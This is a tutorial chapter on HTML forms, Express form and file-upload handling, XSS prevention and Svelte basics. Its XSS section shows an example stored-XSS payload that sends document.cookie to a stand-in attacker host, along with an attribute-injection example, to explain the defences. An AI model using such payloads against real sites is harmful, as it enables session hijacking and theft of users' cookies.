# 8. Forms and Introduction to Svelte 📝

[<- Back to Server-side Rendering and Routers](./07-ssr-routers.md) | [Next: Svelte Components ->](./09-svelte-components.md)

## Table of Contents

- [HTML Forms](#html-forms)
- [Form Handling in Express](#form-handling-in-express)
- [Cross-Site Scripting (XSS) Prevention](#cross-site-scripting-xss-prevention)
- [Introduction to Svelte](#introduction-to-svelte)
- [Creating Your First Svelte Project](#creating-your-first-svelte-project)
- [Svelte Components and Syntax](#svelte-components-and-syntax)

## HTML Forms

Forms are a crucial part of web applications, enabling users to submit data to the server.

### Basic Form Structure

```html
<form action="/submit" method="POST">
  <div>
    <label for="name">Name:</label>
    <input type="text" id="name" name="name" required>
  </div>
  
  <div>
    <label for="email">Email:</label>
    <input type="email" id="email" name="email" required>
  </div>
  
  <div>
    <label for="message">Message:</label>
    <textarea id="message" name="message" rows="4" required></textarea>
  </div>
  
  <button type="submit">Submit</button>
</form>
```

### Form Attributes

- **`action`**: The URL where the form data is sent
- **`method`**: The HTTP method to use (`GET` or `POST`)
- **`enctype`**: How the form data is encoded
  - `application/x-www-form-urlencoded` (default)
  - `multipart/form-data` (for file uploads)
  - `text/plain` (rarely used)
- **`novalidate`**: Disables browser validation (if you want to use custom validation)

### Input Types

HTML5 provides various input types for different data:

```html
<!-- Text input -->
<input type="text" name="username">

<!-- Password input -->
<input type="password" name="password">

<!-- Email input -->
<input type="email" name="email">

<!-- Number input -->
<input type="number" name="age" min="18" max="120">

<!-- Date input -->
<input type="date" name="birthdate">

<!-- Color picker -->
<input type="color" name="favorite_color">

<!-- Range slider -->
<input type="range" name="volume" min="0" max="100" step="10">

<!-- Checkbox -->
<input type="checkbox" name="subscribe" id="subscribe">
<label for="subscribe">Subscribe to newsletter</label>

<!-- Radio buttons -->
<input type="radio" name="gender" id="male" value="male">
<label for="male">Male</label>
<input type="radio" name="gender" id="female" value="female">
<label for="female">Female</label>

<!-- Select dropdown -->
<select name="country">
  <option value="">--Select Country--</option>
  <option value="us">United States</option>
  <option value="ca">Canada</option>
  <option value="uk">United Kingdom</option>
</select>

<!-- Multiple select -->
<select name="interests" multiple>
  <option value="sports">Sports</option>
  <option value="music">Music</option>
  <option value="art">Art</option>
</select>

<!-- File upload -->
<input type="file" name="profile_picture">

<!-- Multiple file upload -->
<input type="file" name="gallery" multiple>

<!-- Hidden field -->
<input type="hidden" name="user_id" value="12345">

<!-- Submit button -->
<input type="submit" value="Submit">

<!-- Reset button -->
<input type="reset" value="Reset">
```

### Form Validation

HTML5 provides built-in validation attributes:

```html
<!-- Required fields -->
<input type="text" name="username" required>

<!-- Minimum and maximum length -->
<input type="text" name="username" minlength="3" maxlength="20">

<!-- Pattern matching with regular expressions -->
<input type="text" name="username" pattern="[a-zA-Z0-9]+" title="Only alphanumeric characters allowed">

<!-- Number range -->
<input type="number" name="age" min="18" max="120">

<!-- Custom validation message -->
<input type="email" name="email" required oninvalid="this.setCustomValidity('Please enter a valid email address')" oninput="this.setCustomValidity('')">
```

### Form Submission Methods

#### GET Method

```html
<form action="/search" method="GET">
  <input type="text" name="query">
  <button type="submit">Search</button>
</form>
```

- Data is appended to the URL as query parameters
- Visible in the browser address bar
- Limited amount of data can be sent
- Can be bookmarked
- Good for search forms

#### POST Method

```html
<form action="/submit" method="POST">
  <input type="text" name="username">
  <input type="password" name="password">
  <button type="submit">Login</button>
</form>
```

- Data is sent in the request body
- Not visible in the URL
- Can send larger amounts of data
- Cannot be bookmarked
- Good for forms that change data or contain sensitive information

### File Upload Forms

For file uploads, you must use `method="POST"` and `enctype="multipart/form-data"`:

```html
<form action="/upload" method="POST" enctype="multipart/form-data">
  <div>
    <label for="profile">Profile Picture:</label>
    <input type="file" id="profile" name="profile" accept="image/*">
  </div>
  
  <div>
    <label for="documents">Documents:</label>
    <input type="file" id="documents" name="documents" multiple accept=".pdf,.doc,.docx">
  </div>
  
  <button type="submit">Upload</button>
</form>
```

## Form Handling in Express

To handle form submissions in Express, you need to parse the incoming request body.

### URL-Encoded Form Data

For standard form submissions (`application/x-www-form-urlencoded`):

```javascript
import express from 'express';
const app = express();

// Middleware to parse URL-encoded bodies
app.use(express.urlencoded({ extended: true }));

app.post('/submit', (req, res) => {
  const { name, email, message } = req.body;
  
  console.log('Form submission:', { name, email, message });
  
  // Process the data (save to database, etc.)
  
  // Respond to the user
  res.send('Form submitted successfully!');
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});
```

### File Uploads with Multer

For file uploads (`multipart/form-data`), you need a package like Multer:

```bash
npm install multer
```

```javascript
import express from 'express';
import multer from 'multer';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// Configure storage
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, path.join(__dirname, 'uploads')); // Save to uploads directory
  },
  filename: (req, file, cb) => {
    // Create unique filename: timestamp-originalname
    cb(null, `${Date.now()}-${file.originalname}`);
  }
});

// File filter function
const fileFilter = (req, file, cb) => {
  // Accept only image files
  if (file.mimetype.startsWith('image/')) {
    cb(null, true);
  } else {
    cb(new Error('Not an image! Please upload an image file.'), false);
  }
};

// Initialize multer
const upload = multer({ 
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 1024 * 1024 * 5 // 5 MB limit
  }
});

// Parse URL-encoded bodies
app.use(express.urlencoded({ extended: true }));

// Single file upload route
app.post('/upload/profile', upload.single('profile'), (req, res) => {
  if (!req.file) {
    return res.status(400).send('No file uploaded.');
  }
  
  res.json({
    message: 'File uploaded successfully',
    file: req.file
  });
});

// Multiple file upload route
app.post('/upload/gallery', upload.array('photos', 5), (req, res) => {
  if (!req.files || req.files.length === 0) {
    return res.status(400).send('No files uploaded.');
  }
  
  res.json({
    message: 'Files uploaded successfully',
    files: req.files
  });
});

// Mixed file and field upload
app.post(
  '/upload/product',
  upload.fields([
    { name: 'image', maxCount: 1 },
    { name: 'gallery', maxCount: 5 }
  ]),
  (req, res) => {
    res.json({
      message: 'Product data uploaded',
      fields: req.body,
      files: req.files
    });
  }
);

// Error handling for multer
app.use((err, req, res, next) => {
  if (err instanceof multer.MulterError) {
    if (err.code === 'LIMIT_FILE_SIZE') {
      return res.status(400).send('File too large. Max size is 5MB.');
    }
    return res.status(400).send(err.message);
  }
  next(err);
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});
```

### Handling JSON Form Submissions

For form submissions from JavaScript with JSON data:

```javascript
import express from 'express';
const app = express();

// Middleware to parse JSON bodies
app.use(express.json());

app.post('/api/submit', (req, res) => {
  const { name, email, message } = req.body;
  
  console.log('API form submission:', { name, email, message });
  
  // Process the data (save to database, etc.)
  
  // Respond with JSON
  res.json({
    success: true,
    message: 'Form submitted successfully!'
  });
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});
```

### Form Validation

For server-side validation, you can use a library like `express-validator`:

```bash
npm install express-validator
```

```javascript
import express from 'express';
import { body, validationResult } from 'express-validator';

const app = express();

app.use(express.urlencoded({ extended: true }));

app.post(
  '/register',
  // Validation middleware
  [
    body('username')
      .trim()
      .isLength({ min: 3, max: 20 })
      .withMessage('Username must be between 3 and 20 characters')
      .isAlphanumeric()
      .withMessage('Username must only contain letters and numbers'),
      
    body('email')
      .isEmail()
      .withMessage('Must be a valid email address')
      .normalizeEmail(),
      
    body('password')
      .isLength({ min: 8 })
      .withMessage('Password must be at least 8 characters')
      .matches(/\d/)
      .withMessage('Password must contain a number'),
      
    body('confirmPassword')
      .custom((value, { req }) => {
        if (value !== req.body.password) {
          throw new Error('Password confirmation does not match password');
        }
        return true;
      })
  ],
  // Request handler
  (req, res) => {
    // Check for validation errors
    const errors = validationResult(req);
    
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    
    // Process valid data
    const { username, email, password } = req.body;
    
    // Create user in database, etc.
    
    res.json({
      success: true,
      message: 'Registration successful!'
    });
  }
);

app.listen(3000, () => {
  console.log('Server running on port 3000');
});
```

## Cross-Site Scripting (XSS) Prevention

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious client-side scripts into web pages viewed by other users.

### Types of XSS Attacks

1. **Stored XSS**: Malicious code is stored on the server (e.g., in a database) and served to other users later
2. **Reflected XSS**: Malicious code is reflected off the web server through a request parameter or form submission
3. **DOM-based XSS**: Vulnerability exists in client-side code rather than server-side code

### XSS Example

Consider a comment form that renders user input directly:

```html
<!-- Vulnerable code -->
<div class="comments">
  <!-- Server renders this from database -->
  <div class="comment">
    <h3>User123</h3>
    <p>Hello, this is a comment!</p>
  </div>
  
  <!-- Attacker submits this -->
  <div class="comment">
    <h3>Hacker</h3>
    <p><script>document.location='https://malicious-site.com/steal.php?cookie='+document.cookie</script></p>
  </div>
</div>
```

### XSS Prevention Techniques

#### 1. Input Sanitization

Always sanitize user inputs on the server:

```javascript
import express from 'express';
import xss from 'xss';

const app = express();

app.use(express.urlencoded({ extended: true }));

app.post('/comment', (req, res) => {
  // Sanitize the comment text
  const sanitizedComment = xss(req.body.comment);
  
  // Store sanitized comment in database
  // ...
  
  res.redirect('/comments');
});
```

#### 2. Output Encoding

When rendering user-provided content, use appropriate encoding:

```javascript
// EJS template example
<div class="comment">
  <h3><%= username %></h3> <!-- Auto-escaped by EJS -->
  <p><%= comment %></p> <!-- Auto-escaped by EJS -->
</div>

// Manual escaping in vanilla JavaScript
function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
```

#### 3. Content Security Policy (CSP)

Implement a CSP header to restrict the sources of executable scripts:

```javascript
import express from 'express';
import helmet from 'helmet';

const app = express();

// Use Helmet's CSP middleware
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "trusted-cdn.com"],
      styleSrc: ["'self'", "trusted-cdn.com"],
      imgSrc: ["'self'", "trusted-cdn.com", "data:"],
      connectSrc: ["'self'", "api.example.com"],
      fontSrc: ["'self'", "trusted-cdn.com"],
      objectSrc: ["'none'"],
      formAction: ["'self'"],
      frameAncestors: ["'self'"]
    },
  })
);
```

#### 4. Use Safe innerHTML Alternatives

In client-side JavaScript, avoid using `innerHTML` when possible:

```javascript
// Unsafe:
element.innerHTML = userProvidedContent;

// Safer:
element.textContent = userProvidedContent;

// Or for simple HTML:
const div = document.createElement('div');
div.className = 'comment';
div.textContent = userProvidedContent;
container.appendChild(div);
```

#### 5. Use Frameworks with Built-in Protection

Modern frameworks like React, Vue, and Svelte automatically escape content by default:

```jsx
// React automatically escapes this
function Comment({ username, text }) {
  return (
    <div className="comment">
      <h3>{username}</h3>
      <p>{text}</p>
    </div>
  );
}

// Svelte automatically escapes this
<div class="comment">
  <h3>{username}</h3>
  <p>{text}</p>
</div>
```

#### 6. HTTP-only Cookies

Use HTTP-only cookies for sensitive information:

```javascript
res.cookie('sessionId', 'abc123', { 
  httpOnly: true,  // Not accessible via JavaScript
  secure: true,     // HTTPS only
  sameSite: 'strict' // Restrict to same site
});
```

#### 7. XSS in HTML Attributes

Be careful with dynamic attributes:

```html
<!-- Vulnerable -->
<div id="user-<%= userId %>"> <!-- If userId is "123 onmouseover=alert(1)" -->

<!-- Safe -->
<div id="user-<%= encodeURIComponent(userId) %>">
```

## Introduction to Svelte

Svelte is a modern JavaScript framework for building user interfaces. Unlike traditional frameworks that do the bulk of their work in the browser, Svelte shifts that work to the compile step.

### What Makes Svelte Different?

- **Compile-time framework**: Svelte converts your components into efficient JavaScript at build time
- **No virtual DOM**: Unlike React or Vue, Svelte doesn't use a virtual DOM diffing algorithm
- **Less boilerplate**: Simpler syntax with fewer lines of code
- **Truly reactive**: Variables automatically trigger UI updates when changed, without needing special state objects
- **Small bundle size**: Compiled applications are typically smaller than other frameworks

### Svelte Philosophy

1. **Write less code**: Svelte aims to reduce boilerplate while maintaining readability
2. **No runtime overhead**: The framework "disappears" during compilation
3. **Truly reactive**: Reactivity is built into the language, not added as a library feature
4. **Enhanced developer experience**: Clear syntax and helpful compiler warnings

### When to Use Svelte

Svelte is great for:

- Small to medium-sized applications
- Applications where performance is critical
- Projects where bundle size matters
- Teams who prefer a simpler syntax
- Progressive enhancement of existing sites
- Projects where SEO is important (Svelte works well with SSR)

## Creating Your First Svelte Project

Svelte projects are typically created using Vite as the build tool.

### Setting Up with Vite

```bash
# Create a new project
npm create vite@latest my-svelte-app -- --template svelte

# Navigate to the new project directory
cd my-svelte-app

# Install dependencies
npm install

# Start the development server
npm run dev
```

### Project Structure

A typical Svelte project created with Vite has this structure:

```
my-svelte-app/
├── node_modules/
├── public/            # Static assets
│   └── favicon.png
├── src/               # Source code
│   ├── lib/           # Shared components and utilities
│   ├── App.svelte     # Root component
│   └── main.js        # Entry point
├── .gitignore
├── index.html         # HTML template
├── package.json
├── svelte.config.js   # Svelte configuration
└── vite.config.js     # Vite configuration
```

### The Entry Point

The `main.js` file is the entry point of your Svelte application:

```javascript
// src/main.js
import './app.css'
import App from './App.svelte'

const app = new App({
  target: document.getElementById('app')
})

export default app
```

### The Root Component

The `App.svelte` file is the root component of your application:

```html
<!-- src/App.svelte -->
<script>
  let name = 'world';
</script>

<main>
  <h1>Hello {name}!</h1>
  <p>Visit <a href="https://svelte.dev">svelte.dev</a> to learn more.</p>
</main>

<style>
  main {
    text-align: center;
    padding: 1em;
    max-width: 240px;
    margin: 0 auto;
  }

  h1 {
    color: #ff3e00;
    text-transform: uppercase;
    font-size: 4em;
    font-weight: 100;
  }

  @media (min-width: 640px) {
    main {
      max-width: none;
    }
  }
</style>
```

## Svelte Components and Syntax

Svelte components are files with a `.svelte` extension that contain HTML, CSS, and JavaScript.

### Basic Component Structure

```html
<script>
  // JavaScript goes here
  let count = 0;
  
  function increment() {
    count += 1;
  }
</script>

<!-- HTML goes here -->
<button on:click={increment}>
  Clicked {count} {count === 1 ? 'time' : 'times'}
</button>

<style>
  /* CSS goes here - scoped to this component only */
  button {
    background: #ff3e00;
    color: white;
    border: none;
    padding: 0.5em 1em;
    border-radius: 2px;
  }
</style>
```

### Data and Reactivity

One of Svelte's key features is its straightforward reactivity:

```html
<script>
  let count = 0;
  
  // This will be recalculated when count changes
  $: doubled = count * 2;
  
  // Reactive statements
  $: if (count >= 10) {
    alert('Count is getting high!');
  }
  
  function increment() {
    count += 1;
  }
</script>

<button on:click={increment}>Increment</button>
<p>Count: {count}</p>
<p>Doubled: {doubled}</p>
```

### Props

Svelte uses a simple approach to component props:

```html
<!-- Parent.svelte -->
<script>
  import Child from './Child.svelte';
  let name = 'World';
</script>

<Child name={name} />

<!-- Child.svelte -->
<script>
  export let name; // Declares a prop
  export let greeting = "Hello"; // Prop with default value
</script>

<p>{greeting}, {name}!</p>
```

### Events

Handling events in Svelte is straightforward:

```html
<script>
  let count = 0;
  
  function increment() {
    count += 1;
  }
  
  function handleKeydown(event) {
    if (event.key === 'Enter') {
      alert('You pressed Enter!');
    }
  }
</script>

<button on:click={increment}>Clicked {count} times</button>
<input on:keydown={handleKeydown} placeholder="Press Enter...">

<!-- Inline event handlers -->
<button on:click={() => count = 0}>Reset</button>

<!-- Event modifiers -->
<button on:click|once={increment}>Click only once</button>
<button on:click|preventDefault={increment}>No default action</button>
```

### Conditional Rendering

Svelte uses simple `if` blocks for conditional rendering:

```html
<script>
  let user = { loggedIn: false };
  
  function toggle() {
    user.loggedIn = !user.loggedIn;
  }
</script>

{#if user.loggedIn}
  <button on:click={toggle}>Log out</button>
{:else}
  <button on:click={toggle}>Log in</button>
{/if}
```

### Looping

Svelte uses `each` blocks for iterating over arrays:

```html
<script>
  let colors = ['red', 'green', 'blue'];
  
  let tasks = [
    { id: 1, text: 'Learn Svelte', done: true },
    { id: 2, text: 'Build an app', done: false },
    { id: 3, text: 'Deploy to production', done: false }
  ];
  
  function toggleTask(id) {
    tasks = tasks.map(task => 
      task.id === id ? { ...task, done: !task.done } : task
    );
  }
</script>

<h2>Colors:</h2>
<ul>
  {#each colors as color, index}
    <li style="color: {color}">
      {index + 1}: {color}
    </li>
  {/each}
</ul>

<h2>Tasks:</h2>
<ul>
  {#each tasks as task (task.id)}
    <li>
      <input 
        type="checkbox" 
        checked={task.done} 
        on:change={() => toggleTask(task.id)}
      >
      <span class:done={task.done}>
        {task.text}
      </span>
    </li>
  {/each}
</ul>

<style>
  .done {
    text-decoration: line-through;
    opacity: 0.7;
  }
</style>
```

### Two-way Binding

Svelte makes form handling easy with two-way binding:

```html
<script>
  let name = '';
  let email = '';
  let country = '';
  let acceptTerms = false;
  
  function handleSubmit() {
    alert(`Submitted: ${name}, ${email}, ${country}, Terms: ${acceptTerms}`);
  }
</script>

<form on:submit|preventDefault={handleSubmit}>
  <div>
    <label for="name">Name:</label>
    <input id="name" bind:value={name} required>
  </div>
  
  <div>
    <label for="email">Email:</label>
    <input id="email" type="email" bind:value={email} required>
  </div>
  
  <div>
    <label for="country">Country:</label>
    <select id="country" bind:value={country} required>
      <option value="">--Select Country--</option>
      <option value="us">United States</option>
      <option value="ca">Canada</option>
      <option value="uk">United Kingdom</option>
    </select>
  </div>
  
  <div>
    <label>
      <input type="checkbox" bind:checked={acceptTerms}>
      I accept the terms and conditions
    </label>
  </div>
  
  <button type="submit" disabled={!acceptTerms}>Submit</button>
</form>

<p>Name: {name}</p>
<p>Email: {email}</p>
<p>Country: {country}</p>
<p>Accepted Terms: {acceptTerms ? 'Yes' : 'No'}</p>
```

### Lifecycle Methods

Svelte provides lifecycle functions for executing code at specific times:

```html
<script>
  import { onMount, onDestroy, beforeUpdate, afterUpdate } from 'svelte';
  
  let count = 0;
  
  // Called when the component is mounted to the DOM
  onMount(() => {
    console.log('Component mounted');
    const interval = setInterval(() => count++, 1000);
    
    // Return a cleanup function
    return () => clearInterval(interval);
  });
  
  // Called before the DOM is updated
  beforeUpdate(() => {
    console.log('Before update', count);
  });
  
  // Called after the DOM is updated
  afterUpdate(() => {
    console.log('After update', count);
  });
  
  // Called when the component is destroyed
  onDestroy(() => {
    console.log('Component destroyed');
  });
</script>

<p>Count: {count}</p>
```

---

[<- Back to Main Note](./README.md) | [Next: Svelte Components ->](./09-svelte-components.md)
